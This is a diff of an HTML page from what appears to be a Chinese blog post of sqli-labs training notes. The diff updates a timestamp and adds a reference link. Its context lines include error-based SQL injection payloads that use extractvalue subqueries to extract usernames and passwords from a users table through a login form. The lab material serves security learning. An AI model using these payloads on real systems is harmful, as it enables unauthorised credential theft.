@@ -112,7 +112,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-68598009602423b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-728dc1675bc8fd95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-344a8cee3dd5c603.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-11-05T17:20:12.182Z">
+<meta property="og:updated_time" content="2018-11-05T17:21:47.982Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[sqli-labs] 学习">
 <meta name="twitter:description" content="#基础知识  select  from  LIMIT N; –检索前N行数据，显示1-N条数据 select  from  LIMIT N,M; –从第N行数据为起点，检索M行数据 如select  from  LIMIT 0,1; –从第0行开始检索1条数据，其实就是输出第一条的数据 select  from  LIMIT M OFFSET N;  –从第N行数据为起点，检索M行数据，跟limi">
@@ -594,6 +594,9 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp; passwd=1&apos; and uname=admin &amp; passwd=1&apos; and extractvalue(1,concat(0x7e,(select u2.username from (select u1.username from users u1) u2 limit 7,1),0x7e))  #&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin &amp; passwd=1&apos; and uname=admin &amp; passwd=1&apos; and extractvalue(1,concat(0x7e,(select u2.password from (select u1.password from users u1) u2 limit 7,1),0x7e))  #&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 <p><img src="https://upload-images.jianshu.io/upload_images/5808046-344a8cee3dd5c603.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>参考文章： <a href="https://blog.csdn.net/z_youarethebest/article/details/53785487" target="_blank" rel="noopener">https://blog.csdn.net/z_youarethebest/article/details/53785487</a></li>
+</ul>
 <h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1>
       
     </div>
